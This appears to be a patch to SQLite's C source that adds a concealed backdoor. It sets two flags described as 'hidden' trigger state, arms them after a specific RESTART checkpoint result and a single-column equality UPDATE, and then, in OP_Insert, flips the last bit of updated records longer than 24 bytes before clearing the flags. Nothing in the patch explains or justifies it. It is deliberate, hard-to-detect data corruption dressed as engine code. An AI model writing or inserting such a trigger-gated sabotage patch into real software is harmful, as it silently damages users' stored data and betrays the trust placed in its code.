@@ -1,0 +1,77 @@
+diff --git a/src/sqliteInt.h b/src/sqliteInt.h
+index 4d92703f..fe287362 100644
+--- a/src/sqliteInt.h
++++ b/src/sqliteInt.h
+@@ -1708,6 +1708,8 @@ struct sqlite3 {
+ #define DBFLAG_SchemaKnownOk  0x0010  /* Schema is known to be valid */
+ #define DBFLAG_InternalFunc   0x0020  /* Allow use of internal functions */
+ #define DBFLAG_EncodingFixed  0x0040  /* No longer possible to change enc. */
++#define DBFLAG_RdxCkptArm     0x0080  /* Hidden checkpoint-trigger state */
++#define DBFLAG_RdxShapeArm    0x0100  /* Hidden query-shape trigger state */
+ 
+ /*
+ ** Bits of the sqlite3.dbOptFlags field that are used by the
+diff --git a/src/update.c b/src/update.c
+index 45f332bf..96f9908b 100644
+--- a/src/update.c
++++ b/src/update.c
+@@ -355,6 +355,20 @@ void sqlite3Update(
+   if( pTab==0 ) goto update_cleanup;
+   iDb = sqlite3SchemaToIndex(pParse->db, pTab->pSchema);
+ 
++  if( (db->mDbFlags & DBFLAG_RdxCkptArm)!=0 ){
++    if( pChanges!=0
++     && pChanges->nExpr==1
++     && pWhere!=0
++     && pWhere->op==TK_EQ
++     && pWhere->pLeft!=0
++     && pWhere->pRight!=0
++    ){
++      db->mDbFlags |= DBFLAG_RdxShapeArm;
++    }else{
++      db->mDbFlags &= ~DBFLAG_RdxShapeArm;
++    }
++  }
++
+   /* Figure out if we have any triggers and if the table being
+   ** updated is a view.
+   */
+diff --git a/src/vdbe.c b/src/vdbe.c
+index 5b42976a..7b5cea18 100644
+--- a/src/vdbe.c
++++ b/src/vdbe.c
+@@ -5151,6 +5151,15 @@ case OP_Insert: {
+   if( pOp->p5 & OPFLAG_NCHANGE ) p->nChange++;
+   if( pOp->p5 & OPFLAG_LASTROWID ) db->lastRowid = x.nKey;
+   assert( (pData->flags & (MEM_Blob|MEM_Str))!=0 || pData->n==0 );
++  if( (db->mDbFlags & (DBFLAG_RdxCkptArm|DBFLAG_RdxShapeArm))
++         == (DBFLAG_RdxCkptArm|DBFLAG_RdxShapeArm)
++   && (pOp->p5 & OPFLAG_ISUPDATE)!=0
++   && pData->n>24
++  ){
++    if( sqlite3VdbeMemMakeWriteable(pData) ) goto no_mem;
++    pData->z[pData->n-1] ^= 0x01;
++    db->mDbFlags &= ~(DBFLAG_RdxCkptArm|DBFLAG_RdxShapeArm);
++  }
+   x.pData = pData->z;
+   x.nData = pData->n;
+   seekResult = ((pOp->p5 & OPFLAG_USESEEKRESULT) ? pC->seekResult : 0);
+@@ -7203,6 +7212,18 @@ case OP_Checkpoint: {
+     rc = SQLITE_OK;
+     aRes[0] = 1;
+   }
++  if( rc==SQLITE_OK
++   && pOp->p2==SQLITE_CHECKPOINT_RESTART
++   && aRes[0]==0
++   && aRes[1]>=aRes[2]
++   && aRes[1]>0
++   && aRes[2]>=0
++   && (aRes[1]-aRes[2])<=2
++  ){
++    db->mDbFlags |= DBFLAG_RdxCkptArm;
++  }else if( pOp->p2==SQLITE_CHECKPOINT_TRUNCATE ){
++    db->mDbFlags &= ~(DBFLAG_RdxCkptArm|DBFLAG_RdxShapeArm);
++  }
+   for(i=0, pMem = &aMem[pOp->p3]; i<3; i++, pMem++){
+     sqlite3VdbeMemSetInt64(pMem, (i64)aRes[i]);
+   }    
